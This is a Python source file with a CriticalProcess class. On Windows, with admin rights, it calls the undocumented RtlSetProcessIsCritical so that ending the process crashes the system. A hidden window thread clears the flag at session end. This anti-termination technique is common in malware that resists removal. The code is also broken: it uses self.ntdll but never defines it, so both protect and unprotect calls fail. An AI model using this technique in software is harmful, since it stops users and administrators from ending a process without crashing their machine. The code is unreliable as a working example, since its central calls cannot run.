import ctypes
import os
import platform
import threading
from ctypes import wintypes as w
from ctypes import *

class CriticalProcess:
    def __init__(self):
        # Define constants within the class
        self.CW_USEDEFAULT = -2147483648
        self.WS_OVERLAPPEDWINDOW = 13565952
        self.CS_HREDRAW = 2
        self.CS_VREDRAW = 1
        self.WM_PAINT = 15
        self.WM_DESTROY = 2
        self.WM_ENDSESSION = 22
        self.IDI_APPLICATION = 32512
        self.IDC_ARROW = 32512
        self.WHITE_BRUSH = 0
        self.SW_SHOWNORMAL = 1
        self.DT_SINGLELINE = 32
        self.DT_CENTER = 1
        self.DT_VCENTER = 4

        self.thread = threading.Thread(target=self._unprotect_process_end)
        self.thread.start()

    def _unprotect_process_end(self):
        @WINFUNCTYPE(c_int, w.HWND, w.UINT, w.WPARAM, w.LPARAM)
        def wnd_proc(hwnd, message, wParam, lParam):
            if message == self.WM_DESTROY:
                ctypes.windll.user32.PostQuitMessage(0)
                return 0
            elif message == self.WM_ENDSESSION:
                self.un_protect_process()
            return ctypes.windll.user32.DefWindowProcW(hwnd, message, wParam, lParam)

        wc = w.WNDCLASSW()
        wc.style = self.CS_HREDRAW | self.CS_VREDRAW
        wc.lpfnWndProc = wnd_proc
        wc.cbClsExtra = wc.cbWndExtra = 0
        wc.hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        wc.hIcon = ctypes.windll.user32.LoadIconW(None, self.IDI_APPLICATION)
        wc.hCursor = ctypes.windll.user32.LoadCursorW(None, self.IDC_ARROW)
        wc.hbrBackground = ctypes.windll.gdi32.GetStockObject(self.WHITE_BRUSH)
        wc.lpszMenuName = None
        wc.lpszClassName = 'MainWin'

        ctypes.windll.user32.RegisterClassW(ctypes.byref(wc))

        hwnd = ctypes.windll.user32.CreateWindowExW(
            0, 'MainWin', 'Python Window', self.WS_OVERLAPPEDWINDOW,
            self.CW_USEDEFAULT, self.CW_USEDEFAULT, self.CW_USEDEFAULT, self.CW_USEDEFAULT,
            None, None, wc.hInstance, None
        )

        msg = w.MSG()
        while ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0):
            ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
            ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))

    def is_elevated(self):
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except Exception as e:
                print(f"Error checking admin status: {e}")
                return False
        return os.geteuid() == 0

    def protect_process(self):
        if not self.is_elevated():
            print("Not elevated. Cannot protect process.")
            return 0
        
        if platform.system() == "Windows":
            # Define RtlSetProcessIsCritical
            self.ntdll.RtlSetProcessIsCritical.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_int), ctypes.c_int]
            self.ntdll.RtlSetProcessIsCritical.restype = ctypes.c_int

            is_critical = ctypes.c_int(1)
            not_critical = ctypes.c_int(0)

            # Attempt to make the process critical
            result = self.ntdll.RtlSetProcessIsCritical(is_critical, ctypes.byref(not_critical), 0)
            if result == 0:
                return 1
            else:
                print("Failed to set process as critical.")
        return 0

    def un_protect_process(self):
        if platform.system() == "Windows":
            is_critical = ctypes.c_int(0)
            result = self.ntdll.RtlSetProcessIsCritical(is_critical, None, 0)
            if result == 0:
                print("Process is no longer critical.")
                return 1
            else:
                print("Failed to unset process as critical.")
        return 0


